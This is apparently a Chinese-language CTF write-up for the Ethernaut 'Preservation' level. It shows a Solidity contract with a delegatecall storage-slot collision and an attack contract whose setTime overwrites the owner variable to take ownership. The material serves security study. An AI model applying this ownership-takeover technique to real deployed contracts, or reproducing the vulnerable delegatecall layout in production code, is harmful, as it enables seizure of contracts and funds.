#   Level 15 Preservation
實例地址：`0x8ee8f09767AD7995A250F138c91b982772198F78`

##  題目說明
此智慧合約利用一個函式庫來儲存兩個不同時區的兩個不同時間。 建構函數會為每個要儲存的時間創建兩個庫實例。 本關卡的目標是獲得該合約的所有權。

  可能會有用的資訊

*   查閱 Solidity 文檔中的有關低階函數 delegatecall 的信息，包括其工作原理、如何用於委託操作到鏈上庫以及它對執行範圍的影響。
*   理解 delegatecall 保持上下文意味著什麼。
*   理解儲存變數如何儲存和存取。
*   理解不同資料類型之間轉換的工作原理。
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

##  POC
這合約想要使用 `delegatecall` 去更改自身的 `storedTime` ，但是 `delegatecall` 更改的變數擺放位置需要是一樣的才可以做更改到同一個變數，所以我們今天觸發 `setFirstTime()`，更改到的內容是 `timeZone1Library`，所以利用這個漏洞，我先撰寫好一個攻擊合約自訂 `setTime` 函式，將宣告變數排列於原合約相同，再重新呼叫 `setFirstTime()` 可以將 owner 改為自己地址。

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attack{
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    
    constructor(){
    }

    function setTime(uint256 _timeStamp) public {
        owner = address(uint160(_timeStamp));
    }
    
}
```